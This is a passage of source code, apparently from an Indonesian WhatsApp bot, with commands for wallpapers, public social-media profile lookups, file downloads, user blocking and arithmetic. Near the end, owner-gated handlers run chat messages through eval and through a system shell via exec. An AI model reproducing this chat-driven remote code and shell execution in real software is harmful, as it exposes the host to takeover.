case 'wallpapermeme':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let crkr = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/meme.json`)
let random = crkr[Math.floor(Math.random() * crkr.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'wallpaper':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let crpe = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Mountain.json`)
let random = crpe[Math.floor(Math.random() * crpe.length)]
kirbotz.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: fakekirbotz })
}
break
case 'ppcouple': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
kirbotz.sendMessage(m.chat, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: fakekirbotz })
kirbotz.sendMessage(m.chat, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: fakekirbotz })
}
break
case 'tiktokstalk':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} namatt`)
sticWait(from)
ttk = args.join(" ")
csksyb = await fetchJson(`http://api.lolhuman.xyz/api/stalktiktok/${ttk}?apikey=${lolkey}`)
csksyl = csksyb.result
txt = `Username : ${csksyl.username}\n`
txt += `Nickname : ${csksyl.nickname}\n`
txt += `Bio : ${csksyl.bio}\n`
txt += `Followers : ${csksyl.followers}\n`
txt += `Following : ${csksyl.followings}\n`
txt += `Likes : ${csksyl.likes}\n`
txt += `Vidio : ${csksyl.video}\n`
buffer = await getBuffer(csksyl.user_picture)
let message = await prepareWAMessageMedia({ image: buffer }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: txt,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'githubstalk':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} namagh`)
sticWait(from)
ghk = args.join(" ")
csksdke = await fetchJson(`http://api.lolhuman.xyz/api/github/${ghk}?apikey=${lolkey}`)
csksdah = csksdke.result
txt = `Full : ${csksdah.name}\n`
txt += `Followers : ${csksdah.followers}\n`
txt += `Following : ${csksdah.following}\n`
txt += `Publick : ${csksdah.public_repos}\n`
txt += `Public Gits : ${csksdah.public_gists}\n`
txt += `User : ${csksdah.user}\n`
txt += `Compi : ${csksdah.company}\n`
txt += `Lokasi : ${csksdah.location}\n`
txt += `Email : ${csksdah.email}\n`
txt += `Bio : ${csksdah.bio}\n`
buffer = await getBuffer(csksdah.avatar)
let message = await prepareWAMessageMedia({ image: buffer }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: txt,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'igstalk':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} namaig`)
sticWait(from)
igk = args.join(" ")
deshd = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${igk}?apikey=${lolkey}`)
deshxs = deshd.result
txt = `Link : https://www.instagram.com/${deshxs.username}\n`
txt += `Full : ${deshxs.fullname}\n`
txt += `Post : ${deshxs.posts}\n`
txt += `Followers : ${deshxs.followers}\n`
txt += `Following : ${deshxs.following}\n`
txt += `Bio : ${deshxs.bio}\n`
buffer = await getBuffer(deshxs.photo_profile)
let message = await prepareWAMessageMedia({ image: buffer }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: txt,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'ytstalk':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} namachannel`)
sticWait(from)
ytk = args.join(" ")
anu = await fetchJson(`http://api.lolhuman.xyz/api/ytchannel?apikey=${lolkey}&query=${ytk}`)
cari = '↻↻↻↻↻\n'
for (let search of anu.result) {
cari += `Chanel : ${search.channel_name}\nTentang : ${search.channel_about}\nCreated : ${search.channel_created}\nLink : https://youtu.com/channel/${search.channel_id}\n•••••••••••••••••\n`
}
replyNya(cari.trim())
break
case 'spotify':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
                    if (args.length == 0) return replyNya(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    sticWait(from)
                    url = args[0]
                    let get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=${lolkey}&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
let thumbnail = await getBuffer(get_result.thumbnail)
kirbotz.sendMessage(m.chat, { image: thumbnail, caption: ini_txt }, { quoted: fakekirbotz})
break
case 'pacarserti':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return reply(`Contoh: ${prefix + command} Nama1 Nama2`)
sticWait(from)
txt1 = args[0]
txt2 = args[1]
wehw = await getBuffer(`https://api.lolhuman.xyz/api/pacarserti?apikey=${lolkey}&name1=${txt1}&name2=${txt2}`)
let message = await prepareWAMessageMedia({ image: wehw }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: `Nih Kak`,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'randomnama':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${lolkey}`)
replyNya(anu.result)
break
case 'ban': case 'block': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return reply(api.owner)
if (!args[0]) return reply(`Pilih add atau del`)
orgnye = m.mentionedJid[0] ? m.mentionedJid[0] : Number(args[1]) ? Number(args[1]) + "@s.whatsapp.net" : m.quoted ? m.quoted.sender : false
if (!orgnye) return reply(`Example : \n- ${prefix + command} del/add <number/tag/reply>\n- ${prefix + command} del 6281385062956`)
const isBane = banUser ? banUser.includes(orgnye) : false
if (args[0] === "add") {
if (isBane) return reply('User sudah dibanned')
kirbotz.updateBlockStatus(orgnye, 'block')
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('User tidak dibanned')
kirbotz.updateBlockStatus(orgnye, 'unblock')
reply(`Succes delban`)
} else {
reply("Error")
}
}
break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
try {
listBloxk = []
teskd = ``
listnyd = 1
for (let i of banUser) {
teskd += `\n${listnyd++}. @${i.split("@")[0]}`
listBloxk.push({
title: "+" + i.split("@")[0], rowId: `block del ${i.split("@")[0]}`, description: "ketuk untuk mengunblockir"})
}
teskd += `\n\nketuk button untuk mengunblockir`
const sections = [
{
title: "Total Blockir " + banUser.length,
rows: listBloxk
}
]

const listMessage = {
text: teskd,
footer: "_Creator BloodSword_",
title: "     「 List Participants Blockir 」",
buttonText: "List Blockir",
mentions: await kirbotz.parseMention(teskd),
sections
}
kirbotz.sendMessage(from, listMessage, {quoted:m})
} catch {
reply("Tidak ada user yang diblockir")
}
}
break
case 'npmstalk':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} @adiwajshing/baileys`)
eha = await akira.npmstalk(`${q}`)
reply(`*/ Stalking Npm \\*

Nama : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'mediafire':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!text) return reply(`Link Nya Kak???`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Contoh ${prefix+command} https://www.mediafire.com/file/uoo686zvjoouwpr/SC_GRUB_OKEP_%255BNO_CURL_S2M%255D.zip/file`)
const djej = "62881036690566@s.whatsapp.net"
const zk = await akira.mediafiredl(`${text}`)
const mbc = `Nih Kak @${sender.split("@")[0]}\nDownload File Di Atas Yah\n\nUrl : ${zk.url}\nUrl² : ${zk.url2}\nFilename : ${zk.filename}\nFiletype : ${zk.filetype}\nExt : ${zk.ext}\nUpload : ${zk.aploud}\nFilesizeH : ${zk.filesizeH}\nFilesize : ${zk.filesize}`
let buuttoons = [
{buttonId: `${prefix}mksh`, buttonText: {displayText: 'Makasih'}, type: 1}
]
let bguttonMessaage = {
document: { url: zk.url }, 
fileName: `${zk.filename}`, 
mimetype: `application/zip`,
jpegThumbnail: thumb,
caption: mbc,
mentions:[sender, djej],
footer: `_Powered By @${djej.split("@")[0]}_`,
buttons: buuttoons,
headerType: 4,
contextInfo: { "mentionedJid": [sender, djej]
}}
kirbotz.sendMessage(m.chat, bguttonMessaage)
}
break
case 'tambah':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Pertambahan 

Dan Hasil Nya 
${nilai_one} + ${nilai_two} = ${nilai_one + nilai_two}`)
break
case 'kurang':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perkurangan 

Dan Hasil Nya 
${nilai_one} - ${nilai_two} = ${nilai_one - nilai_two}`)
break
case 'kali':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perkalian

Dan Hasil Nya 
${nilai_one} × ${nilai_two} = ${nilai_one * nilai_two}`)
break
case 'bagi':
if (args.length == 0) return reply(`Contoh: ${prefix + command} 2 1`)
var nilai_one = Number(args[0])
var nilai_two = Number(args[1])
reply(`Perbagian

Dan Hasil Nya 
${nilai_one} ÷ ${nilai_two} = ${nilai_one / nilai_two}`)
break
default:
}

if (budy.startsWith('=>')) {
if (!isCreator) return replyNya(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return replyNya(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('<')) {
if (!isCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('$')){
if (!isCreator) return reply(mess.owner)
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

} catch (err) {
m.reply(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})

process.on('uncaughtException', console.error);
